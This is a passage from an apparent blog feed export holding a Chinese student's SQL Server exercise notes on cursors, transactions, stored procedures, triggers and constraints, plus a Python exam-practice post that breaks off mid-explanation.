Emp_cursor scroll <span class="token keyword">cursor</span><span class="token keyword">for</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> Employee<span class="token keyword">open</span> Emp_cursor<span class="token keyword">fetch</span> <span class="token keyword">next</span> <span class="token keyword">from</span> Emp_cursor<span class="token keyword">fetch</span> prior <span class="token keyword">from</span> Emp_cursor<span class="token keyword">fetch</span> <span class="token keyword">first</span> <span class="token keyword">from</span> Emp_cursor<span class="token keyword">fetch</span> <span class="token keyword">last</span> <span class="token keyword">from</span> Emp_cursor<span class="token keyword">fetch</span> absolute <span class="token number">2</span> <span class="token keyword">from</span> Emp_cursor<span class="token keyword">fetch</span> relative <span class="token number">2</span> <span class="token keyword">from</span> Emp_cursor<span class="token keyword">close</span> Emp_cursor<span class="token keyword">deallocate</span> Emp_cursor</code></pre><p>4、建立的事务：规定员工表只能插入7条记录，如果超出7条记录，则输出插入记录数超过规定数，插入失败。否则输出插入成功。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">begin</span> <span class="token keyword">transaction</span>    <span class="token keyword">insert</span> <span class="token keyword">into</span> Employee <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'E008'</span><span class="token punctuation">,</span><span class="token string">'周世海'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token string">'1992-04-15'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">3100</span><span class="token punctuation">,</span><span class="token string">'D001'</span><span class="token punctuation">)</span><span class="token keyword">declare</span> <span class="token variable">@Count</span> <span class="token keyword">int</span><span class="token keyword">select</span> <span class="token variable">@Count</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> Employee<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token variable">@Count</span><span class="token operator">></span><span class="token number">7</span>    <span class="token keyword">begin</span>        <span class="token keyword">rollback</span> <span class="token keyword">transaction</span>        <span class="token keyword">print</span> <span class="token string">'插入记录数超过规定数，插入失败！'</span>    <span class="token keyword">end</span><span class="token keyword">else</span>    <span class="token keyword">begin</span>        <span class="token keyword">commit</span> <span class="token keyword">transaction</span>        <span class="token keyword">print</span> <span class="token string">'插入成功！'</span>    <span class="token keyword">end</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库程序设计与数据库编程技术练习题</title>
      <link href="posts/ffde.html"/>
      <url>posts/ffde.html</url>
      
        <content type="html"><![CDATA[<h2 id="数据库程序设计与数据库编程技术练习题"><a href="#数据库程序设计与数据库编程技术练习题" class="headerlink" title="数据库程序设计与数据库编程技术练习题"></a>数据库程序设计与数据库编程技术练习题</h2><p>1、    用IF….ELSE语句实现下面功能：在员工表中，如果存在工资大于等于4000的员工，<br>–则输出该员工的员工号、员工名、工资、部门号和部门名。否则输出没有满足条件的员工。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">if</span> <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> Employee <span class="token keyword">where</span> Wages<span class="token operator">>=</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token keyword">select</span> EmplID<span class="token punctuation">,</span>EmplName<span class="token punctuation">,</span>Wages<span class="token punctuation">,</span>Department<span class="token punctuation">.</span>DeptID<span class="token punctuation">,</span> DeptName <span class="token keyword">from</span> Employee <span class="token punctuation">,</span>Department<span class="token keyword">where</span> Employee<span class="token punctuation">.</span>DeptID<span class="token operator">=</span>Department<span class="token punctuation">.</span>DeptID <span class="token operator">and</span> Wages<span class="token operator">>=</span><span class="token number">4000</span><span class="token keyword">else</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'没有满足条件的员工!'</span><span class="token punctuation">)</span></code></pre><p>2、    用while语句实现下面功能：计算1+2+3+4的值。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@a</span> <span class="token keyword">int</span><span class="token punctuation">,</span><span class="token variable">@sum</span> <span class="token keyword">int</span><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">set</span> <span class="token variable">@sum</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">@a</span><span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">begin</span><span class="token keyword">set</span> <span class="token variable">@sum</span><span class="token operator">=</span><span class="token variable">@sum</span><span class="token operator">+</span><span class="token variable">@a</span><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token variable">@a</span><span class="token operator">+</span><span class="token number">1</span><span class="token keyword">end</span><span class="token keyword">print</span> <span class="token variable">@sum</span></code></pre><p>3.查询Employee中所有员工的员工号，姓名，年龄。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> EmplID<span class="token punctuation">,</span>EmplName<span class="token punctuation">,</span>year<span class="token punctuation">(</span>GETDATE<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>YEAR<span class="token punctuation">(</span>Birthday<span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token string">'年龄'</span> <span class="token keyword">from</span> Employee</code></pre><p>4.输出字符串“abc”中每一个字符对应的ASCII值。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@i</span> <span class="token keyword">int</span><span class="token keyword">set</span> <span class="token variable">@i</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">@i</span><span class="token operator">&lt;=</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">begin</span><span class="token keyword">print</span> ascii<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span><span class="token variable">@i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">set</span> <span class="token variable">@i</span><span class="token operator">=</span><span class="token variable">@i</span><span class="token operator">+</span><span class="token number">1</span><span class="token keyword">end</span></code></pre><p>5.创建一个带两个参数的存储过程，一个参数接受传递过来的员工号，<br>–一个参数返回该员工对应的工资。<br>–调用存储过程时，传递一个员工号，调用完成后能输出该员工的工资。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">procedure</span> <span class="token number">abc</span> <span class="token variable">@a</span> char<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">@b</span> money output<span class="token keyword">as</span><span class="token keyword">begin</span><span class="token keyword">set</span> <span class="token variable">@b</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> Wages <span class="token keyword">from</span> dbo<span class="token punctuation">.</span>Employee <span class="token keyword">where</span> EmplID<span class="token operator">=</span><span class="token variable">@a</span><span class="token punctuation">)</span><span class="token keyword">end</span></code></pre><p>调用存储过程：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@b</span> money<span class="token keyword">exec</span>  <span class="token number">abc</span> <span class="token string">'E001'</span><span class="token punctuation">,</span><span class="token variable">@b</span> output<span class="token keyword">print</span> <span class="token variable">@b</span></code></pre><p>用一种参数的写法：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">procedure</span> <span class="token number">abc1</span> <span class="token variable">@a</span> char<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">as</span><span class="token keyword">begin</span><span class="token punctuation">(</span><span class="token keyword">select</span> Wages <span class="token keyword">from</span> dbo<span class="token punctuation">.</span>Employee <span class="token keyword">where</span> EmplID<span class="token operator">=</span><span class="token variable">@a</span><span class="token punctuation">)</span><span class="token keyword">end</span><span class="token keyword">exec</span>  <span class="token number">abc1</span> <span class="token string">'E001'</span><span class="token comment" spellcheck="true">#调用</span></code></pre><p>6.修改第1题存储过程，用来完成根据员工号计算输出年龄。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">alter</span>  <span class="token keyword">procedure</span> <span class="token number">abc</span> <span class="token variable">@a</span> char<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">as</span><span class="token keyword">begin</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2020</span><span class="token operator">-</span>year<span class="token punctuation">(</span>Birthday<span class="token punctuation">)</span> <span class="token keyword">from</span> dbo<span class="token punctuation">.</span>Employee <span class="token keyword">where</span> EmplID<span class="token operator">=</span><span class="token variable">@a</span><span class="token punctuation">)</span><span class="token keyword">end</span></code></pre><p>7.删除第1题的存储过程。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">procedure</span> <span class="token number">abc</span></code></pre><p>8.在StoreSales 数据库的Employee表上创建一个INSERT触发器T_Ins，向Employee表插入数据时，<br>–如果员工号已存在，则禁止插入,并回滚到插入操作前。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TRIGGER</span> T_Ins                <span class="token comment" spellcheck="true">/* 创建INSERT触发器T_Ins */</span>  <span class="token keyword">ON</span> Employee<span class="token keyword">AFTER</span> <span class="token keyword">INSERT</span><span class="token keyword">AS</span><span class="token keyword">BEGIN</span>  <span class="token keyword">DECLARE</span> <span class="token variable">@ID</span> char<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">SELECT</span> <span class="token variable">@ID</span><span class="token operator">=</span>EmplID <span class="token keyword">FROM</span> inserted  <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> EmplID <span class="token keyword">FROM</span> Employee <span class="token keyword">WHERE</span> EmplID<span class="token operator">=</span><span class="token variable">@ID</span><span class="token punctuation">)</span>    <span class="token keyword">BEGIN</span>       <span class="token keyword">PRINT</span> <span class="token string">'该员工号已存在,禁止插入'</span>      <span class="token keyword">ROLLBACK</span> <span class="token keyword">TRANSACTION</span>      <span class="token comment" spellcheck="true">/* 回滚到插入操作之前的状态 */</span>    <span class="token keyword">END</span> <span class="token keyword">END</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Employee <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'E006'</span><span class="token punctuation">,</span><span class="token string">'李11'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token string">'1995-04-26'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span> <span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token string">'D001'</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> Employee<span class="token keyword">delete</span> <span class="token keyword">from</span> Employee<span class="token keyword">where</span> EmplID<span class="token operator">=</span><span class="token string">'E006'</span></code></pre><p>9.在StoreSales 数据库的Employee表上创建一个UPDATE触发器T_Upd，<br>–防止用户修改Employee表的员工号。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TRIGGER</span> T_Upd            <span class="token comment" spellcheck="true">/* 创建UPDATE触发器T_Upd */</span>  <span class="token keyword">ON</span> Employee<span class="token keyword">AFTER</span> <span class="token keyword">UPDATE</span><span class="token keyword">AS</span><span class="token keyword">IF</span> <span class="token keyword">UPDATE</span><span class="token punctuation">(</span>EmplID<span class="token punctuation">)</span>   <span class="token keyword">BEGIN</span>      <span class="token keyword">PRINT</span> <span class="token string">'不能修改员工号'</span>     <span class="token keyword">ROLLBACK</span> <span class="token keyword">TRANSACTION</span>      <span class="token comment" spellcheck="true">/* 回滚到修改操作之前的状态 */</span>   <span class="token keyword">END</span> GO<span class="token keyword">update</span> dbo<span class="token punctuation">.</span>Employee<span class="token keyword">set</span> EmplID<span class="token operator">=</span><span class="token string">'E008'</span><span class="token keyword">where</span> EmplName<span class="token operator">=</span><span class="token string">'刘强'</span></code></pre><p>10.在StoreSales 数据库的Employee表上创建一个DELETE触发器T_Del，<br>–防止用户删除Employee表的记录。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TRIGGER</span> T_Del                 <span class="token comment" spellcheck="true">/* 创建DELETE触发器T_Del */</span>  <span class="token keyword">ON</span> Employee<span class="token keyword">AFTER</span> <span class="token keyword">DELETE</span><span class="token keyword">AS</span>  <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> deleted <span class="token punctuation">)</span>    <span class="token keyword">BEGIN</span>         <span class="token keyword">PRINT</span> <span class="token string">'不能删除Employee表的记录'</span>      <span class="token keyword">ROLLBACK</span> <span class="token keyword">TRANSACTION</span>          <span class="token comment" spellcheck="true">/* 回滚到删除操作之前的状态 */</span>    <span class="token keyword">END</span> GO<span class="token keyword">delete</span> <span class="token keyword">from</span> Employee<span class="token keyword">where</span>  EmplName<span class="token operator">=</span><span class="token string">'刘强'</span></code></pre><p>11.删除触发器T_Ins、T_Upd和T_Del </p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">trigger</span> T_Ins<span class="token punctuation">,</span>T_Upd<span class="token punctuation">,</span>T_Del</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据完整性及数据库程序设计练习题</title>
      <link href="posts/4337.html"/>
      <url>posts/4337.html</url>
      
        <content type="html"><![CDATA[<h2 id="数据完整性及数据库程序设计"><a href="#数据完整性及数据库程序设计" class="headerlink" title="数据完整性及数据库程序设计"></a>数据完整性及数据库程序设计</h2><p>1.自建数据库，在数据库中创建一个stu(sno,sname,ssex,sdept,sage)表，通过constraint关键词为列添加约束条件，其中：sno为主键，ssex 的取值男或女，sage取值范围(0-120)。<br><img src="https://img-blog.csdnimg.cn/20201103190340643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>2.修改表stu,通过constraint为stu的sname列增加一个唯一性约束条件,为stu的sdept列增加默认值为“计算机”约束条件。<br> <img src="https://img-blog.csdnimg.cn/2020110319030676.png#pic_center"><br>3.将stu表中sage列的约束条件改为(0-150)。<br><img src="https://img-blog.csdnimg.cn/20201103190445683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p><p>4.在数据库中创建一个表score(sno,cno,score)，要求：(sno,cno)为主键，sno为外键，同时满足当主表stu中sno中的值修改或者删除时，从表score中的sno值也做相应的修改或者删除，score取值范围(0–100)。<br> <img src="https://img-blog.csdnimg.cn/20201103190506575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>5.在自建数据库中创建一个表student（学号，姓名，性别），其中学号数据类型为用户自定义数据类型Sno_type。<br><img src="https://img-blog.csdnimg.cn/20201103190542355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p><p>6.定义一个局部变量，并通过该变量获取student表中学号为201901学生的姓名并输出。<br> <img src="https://img-blog.csdnimg.cn/20201103190608603.png#pic_center"><br>7.定义两个局部变量var1和var2，给两个变量赋值同时用PRINT输出加法运算之后的结果。<br> <img src="https://img-blog.csdnimg.cn/20201103190633862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>8.定义两个局部变量var3和var4，给两个变量赋值同时用PRINT输出连接运算之后的结果。</p><p><img src="https://img-blog.csdnimg.cn/2020110319070155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>9.从stu表中查询年龄比张三同学大的学生的学号、姓名和年龄。<br> <img src="https://img-blog.csdnimg.cn/20201103190724265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>10.从student表中查询姓名以王开头，并且包含2个字符的学生的信息。</p><p><img src="https://img-blog.csdnimg.cn/20201103190741411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库约束性条件笔记</title>
      <link href="posts/6e53.html"/>
      <url>posts/6e53.html</url>
      
        <content type="html"><![CDATA[<p>1.自建数据库，在数据库中创建一个stu(sno,sname,ssex,sdept,sage)表，通过constraint关键词为列添加约束条件，其中：sno为主键，ssex 的取值男或女，sage取值范围(0-120)。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> STUDENTGO<span class="token keyword">USE</span> STUDENT<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> stu<span class="token punctuation">(</span>sno char<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">CONSTRAINT</span> PK_stu <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>sname char<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ssex char<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">CHECK</span><span class="token punctuation">(</span>ssex <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token string">'女'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sdept char<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>sage <span class="token keyword">int</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">CHECK</span><span class="token punctuation">(</span>sage<span class="token operator">></span><span class="token number">0</span> <span class="token operator">and</span> sage<span class="token operator">&lt;</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>2.修改表stu,通过constraint为stu的sname列增加一个唯一性约束条件,为stu的sdept列增加默认值为“计算机”约束条件。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu<span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> UK_sname <span class="token keyword">UNIQUE</span><span class="token punctuation">(</span>sname<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">CONSTRAINT</span> DF_sdept <span class="token keyword">DEFAULT</span> <span class="token string">'计算机'</span> <span class="token keyword">FOR</span> sdept</code></pre><p>3.将stu表中sage列的约束条件改为(0-150)。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu<span class="token keyword">DROP</span> <span class="token keyword">CONSTRAINT</span> CK__stu__sage__00551192<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu<span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> CK_sage <span class="token keyword">CHECK</span><span class="token punctuation">(</span>sage<span class="token operator">></span><span class="token number">0</span> <span class="token operator">and</span> sage<span class="token operator">&lt;</span><span class="token number">150</span><span class="token punctuation">)</span></code></pre><p>4.在数据库中创建一个表score(sno,cno,score)，要求：(sno,cno)为主键，sno为外键，同时满足当主表stu中sno中的值修改或者删除时，从表score中的sno值也做相应的修改或者删除，score取值范围(0–100)。</p><pre class=" language-sql"><code class="language-sql"> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> score<span class="token punctuation">(</span>  sno char<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span>  <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token keyword">REFERENCES</span> stu<span class="token punctuation">(</span>sno<span class="token punctuation">)</span>  <span class="token keyword">ON</span> <span class="token keyword">DELETE</span> <span class="token keyword">CASCADE</span>  <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CASCADE</span><span class="token punctuation">,</span>  cno char<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  score <span class="token keyword">int</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">CHECK</span><span class="token punctuation">(</span>score <span class="token operator">BETWEEN</span> <span class="token number">0</span> <span class="token operator">AND</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>sno<span class="token punctuation">,</span>cno<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>5.在自建数据库中创建一个表student（学号，姓名，性别），其中学<br>号数据类型为用户自定义数据类型Sno_type。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TYPE</span> Sno_type <span class="token keyword">FROM</span> char<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>GO<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> student<span class="token punctuation">(</span>  学号 Sno_type <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  姓名 char<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  性别 char<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span></code></pre><p>6.定义一个局部变量，并通过该变量获取student表中学号为201901<br>学生的姓名并输出。</p><pre class=" language-sql"><code class="language-sql"> <span class="token keyword">DECLARE</span> <span class="token variable">@a</span> char<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token keyword">SET</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token string">'201901'</span>    <span class="token keyword">SELECT</span> 姓名 <span class="token keyword">FROM</span> STUDENT <span class="token keyword">WHERE</span> 学号<span class="token operator">=</span><span class="token variable">@a</span></code></pre><p>7.定义两个局部变量var1和var2，给两个变量赋值同时用PRINT输出加法运算之后的结果。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@var1</span> <span class="token keyword">int</span><span class="token punctuation">,</span><span class="token variable">@var2</span> <span class="token keyword">int</span><span class="token keyword">SET</span> <span class="token variable">@var1</span><span class="token operator">=</span><span class="token number">123</span>                 <span class="token keyword">SET</span> <span class="token variable">@var2</span><span class="token operator">=</span><span class="token number">456</span>  <span class="token keyword">PRINT</span> <span class="token variable">@var1</span><span class="token operator">+</span><span class="token variable">@var2</span></code></pre><p>8.定义两个局部变量var3和var4，给两个变量赋值同时用PRINT输出连接运算之后的结果。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@var3</span> char<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">@var4</span> char<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token keyword">SET</span> <span class="token variable">@var3</span><span class="token operator">=</span><span class="token string">'张三'</span>                <span class="token keyword">SET</span> <span class="token variable">@var4</span><span class="token operator">=</span><span class="token string">'是信息工程学院的学生'</span>  <span class="token keyword">PRINT</span> <span class="token variable">@var3</span><span class="token operator">+</span><span class="token variable">@var4</span></code></pre><p>9.从stu表中查询年龄比张三同学大的学生的学号、姓名和年龄。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>     sno <span class="token keyword">AS</span> 学号<span class="token punctuation">,</span>sname <span class="token keyword">AS</span> 姓名<span class="token punctuation">,</span>sage <span class="token keyword">AS</span> 年龄<span class="token keyword">FROM</span> stu<span class="token keyword">WHERE</span> sage<span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> sage <span class="token keyword">FROM</span> stu <span class="token keyword">WHERE</span> sname<span class="token operator">=</span><span class="token string">'张三'</span><span class="token punctuation">)</span></code></pre><p>10.从student表中查询姓名以王开头，并且包含2个字符的学生的信息。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token keyword">FROM</span> student<span class="token keyword">WHERE</span> 姓名 <span class="token operator">LIKE</span> <span class="token string">'王_'</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python笔试练习题</title>
      <link href="posts/43d8.html"/>
      <url>posts/43d8.html</url>
      
        <content type="html"><![CDATA[<p>今天写Python作业，发现有几个题不会，应该是因为最近上课没怎么听讲的事，于是把这几个题查一下，万一考试就出这些题了呢，毕竟python期末考试可能会是笔试。</p><p>1.表达式[1, 2, 3]*3的执行结果为:  [1,2,3,1,2,3,1,2,3]<br>解析：数组和数字相乘的实质为复制<br><img src="https://img-blog.csdnimg.cn/20201019194422947.png#pic_center" alt="代码执行"></p><p>2.语句x = 3==3, 5执行结束后，变量x的值为:（True,5）<br>解析：3和3进行判断是否相等，结果为True,所以x=(True,5)<br><img src="https://img-blog.csdnimg.cn/20201019194229709.png#pic_center" alt="代码执行"><br>3.表达式“[3] in [1, 2, 3, 4]”的值为：  False<br>解析：[3]为数组，因此不在数组[1,2,3,4]中，若为 3 in [1,2,3,4] ,则值为True<br><img src="https://img-blog.csdnimg.cn/20201019195037564.png#pic_center" alt="代码执行"><br>4.表达式 int(‘123’, 16) 的值为：  291<br>解析：<br><img src="https://img-blog.csdnimg.cn/20201019195758838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="解析"><br><img src="https://img-blog.csdnimg.cn/20201019195904628.png#pic_center" alt="代码实现"><br>5.表达式 abs(-3) 的值为： 3<br>解析：abs()函数，返回绝对值，参数可以是：浮点数，整型或长整型，正数，负数<br><img src="https://img-blog.csdnimg.cn/20201019200142966.png#pic_center" alt="代码实现"><br>6.切片操作list(range(6))[::2]执行结果为:  [0,2,4]<br>解析：list() 函数用于将元组、区间（range）等转换为列表。<br>range() 函数可创建一个整数列表，一般用在 for 